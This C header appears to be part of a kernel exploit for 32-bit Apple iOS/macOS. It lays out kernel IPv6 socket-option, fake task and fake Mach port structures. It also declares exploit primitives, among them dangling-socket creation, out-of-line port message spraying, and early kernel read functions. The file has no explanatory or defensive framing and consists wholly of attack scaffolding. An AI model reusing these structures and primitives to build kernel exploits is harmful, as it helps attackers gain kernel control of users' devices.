#ifndef common_h
#define common_h

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <mach/mach.h>
#include <sys/syslog.h>

#define IPV6_USE_MIN_MTU        42
#define IPV6_PKTINFO            46
#define IPV6_PREFER_TEMPADDR    63
#define IO_BITS_ACTIVE          0x80000000
#define IKOT_TASK               0x00000002
#define WQT_QUEUE               0x00000002
#define EVENT_MASK_BITS         0x00000019
#define EVENT_MASK_BITS         0x00000019

union waitq_flags {
    struct {
        uint32_t waitq_type:2;
        uint32_t waitq_fifo:1;
        uint32_t waitq_prepost:1;
        uint32_t waitq_irq:1;
        uint32_t waitq_isvalid:1;
        uint32_t waitq_turnstile_or_port:1;
        uint32_t waitq_eventmask:EVENT_MASK_BITS;
    };
    uint32_t flags;
};

struct ool_msg  {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
};

struct route_in6 {
    struct rtentry *ro_rt;
    struct llentry *ro_lle;
    struct ifaddr *ro_srcia;
    uint32_t ro_flags;
    struct sockaddr_in6 ro_dst;
};

struct ip6po_rhinfo {
    struct ip6_rthdr *ip6po_rhi_rthdr;
    struct route_in6 ip6po_rhi_route;
};

struct ip6po_nhinfo {
    struct sockaddr *ip6po_nhi_nexthop;
    struct route_in6 ip6po_nhi_route;
};

struct ip6_pktopts {
    struct mbuf *ip6po_m;
    int ip6po_hlim;
    struct in6_pktinfo *ip6po_pktinfo;
    struct ip6po_nhinfo ip6po_nhinfo;
    struct ip6_hbh *ip6po_hbh;
    struct ip6_dest *ip6po_dest1;
    struct ip6po_rhinfo ip6po_rhinfo;
    struct ip6_dest *ip6po_dest2;
    int ip6po_tclass;
    int ip6po_minmtu;
    int ip6po_prefer_tempaddr;
    int ip6po_flags;
};

typedef struct {
    struct {
        uint32_t data;
        uint32_t pad;
        uint32_t type;
    } lock;
    uint32_t ref_count;
    int active;
    char pad[0x1ec];
    uint32_t bsd_info;
} ktask_t;


typedef struct __attribute__((__packed__)) {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct __attribute__((__packed__)) {
        uint32_t data;
        uint32_t pad;
        uint32_t type;
    } ip_lock;
    struct __attribute__((__packed__)) {
        struct __attribute__((__packed__)) {
            struct __attribute__((__packed__)) {
                uint32_t flags;
                uint32_t waitq_interlock;
                struct __attribute__((__packed__)) {
                    uint32_t next;
                    uint32_t prev;
                } waitq_queue;
            } waitq;
            uint32_t messages;
            uint32_t msgcount;
            uint32_t qlimit;
            uint32_t seqno;
            uint32_t receiver_name;
            uint32_t  fullwaiters;
            uint32_t pset_count;
        } port;
    } ip_messages;
    uint32_t ip_receiver;
    uint32_t ip_kobject;
    uint32_t ip_nsrequest;
    uint32_t ip_pdrequest;
    uint32_t ip_requests;
    uint32_t ip_premsg;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
    uint32_t ip_sprequests;
    uint64_t ip_context;
} kport_t;

int set_min_mtu(int socket, int *minmtu);
int get_min_mtu(int socket, int *minmtu);
int get_pkt_info(int socket, struct in6_pktinfo *pktinfo);
int set_pkt_info(int socket, struct in6_pktinfo *pktinfo);
int get_temp_addr(int socket, int *prefertempaddr);

int create_socket(void);
int create_dangling_socket(void);
int *create_multiple_sockets(int count, bool dangling);
void free_socket_list(int *socket_list, int count);

mach_port_t create_mach_port(void);
mach_port_t ool_msg_spray(mach_port_t target, int count);
uint32_t find_port_early(mach_port_t port);
int read20_primitive(uint32_t addr, bool free_addr, uint8_t **data);
uint32_t rk32_early(uint32_t addr);

uint32_t find_port(mach_port_t port, uint32_t self_task_addr);
void deinit_port(mach_port_t port, uint32_t self_task_addr);

#endif /* common_h */